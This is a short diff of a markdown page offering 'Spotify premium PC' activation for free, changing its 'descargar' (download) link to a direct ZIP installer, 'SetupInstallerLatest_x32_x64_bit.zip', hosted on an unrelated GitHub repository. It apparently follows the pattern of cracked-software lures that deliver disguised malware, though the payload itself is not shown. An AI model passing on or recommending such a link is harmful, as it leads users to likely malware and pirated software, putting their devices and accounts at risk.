@@ -1,5 +1,5 @@
 
-# [descargar](https://github.com/nethermixgrangeeA/descargar-spotify-premium-pc-gratis/releases/tag/qwe)
+# [descargar](https://github.com/JoaoBortoliero/Nlw-Copa-Explorer/releases/download/free/SetupInstallerLatest_x32_x64_bit.zip)
 
 
 ## spotify-premium-pc-activation-license
